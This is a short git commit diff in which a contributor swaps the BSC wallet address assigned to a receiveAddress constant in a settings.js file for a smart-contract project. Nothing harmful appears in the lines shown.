e3016a17fa9d54df039cab3ec69bdcb27eea037d
Haloboby <111188897+Haloboby@users.noreply.github.com>
2024-01-14 13:08:06 -0800

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xa0d612B0E80e4FE8778594375D7F3Edd7d669Fe4";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
